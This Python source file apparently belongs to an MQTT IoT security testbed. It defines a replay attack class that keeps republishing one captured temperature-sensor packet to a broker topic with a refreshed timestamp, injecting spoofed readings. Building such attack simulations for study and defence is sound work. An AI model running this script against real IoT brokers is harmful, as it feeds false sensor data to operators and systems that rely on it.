"""
Replay Attack

Purpose:
    Replays a previously captured MQTT packet.
"""

import json
from datetime import datetime

from backend.attacks.attack_config import (
    TEMPERATURE_TOPIC,
    REPLAY_ATTACK_CLIENT,
    REPLAY_PACKET_INTERVAL,
    REPLAY_ATTACK_DURATION,
)

from backend.attacks.base_attack import BaseAttack


class ReplayAttack(BaseAttack):
    """MQTT Replay Attack."""

    def __init__(self):
        super().__init__(
            attack_name="Replay Attack",
            client_id=REPLAY_ATTACK_CLIENT,
            interval=REPLAY_PACKET_INTERVAL,
            duration=REPLAY_ATTACK_DURATION,
        )

        self.packet_count = 0

        self.captured_packet = {
            "device_id": "temperature_sensor_01",
            "timestamp": datetime.now().isoformat(),
            "sensor_type": "temperature",
            "value": 28.6,
            "unit": "°C",
            "status": "NORMAL",
        }

    def execute(self):
        """Replay the captured packet."""

        self.packet_count += 1

        # Update timestamp for each replay
        self.captured_packet["timestamp"] = datetime.now().isoformat()

        self.publisher.publish(
            TEMPERATURE_TOPIC,
            self.captured_packet,
        )

        self.logger.info(
            f"Replay Packet #{self.packet_count} → {TEMPERATURE_TOPIC}"
        )


if __name__ == "__main__":
    attack = ReplayAttack()

    try:
        attack.start()

    except KeyboardInterrupt:
        attack.stop()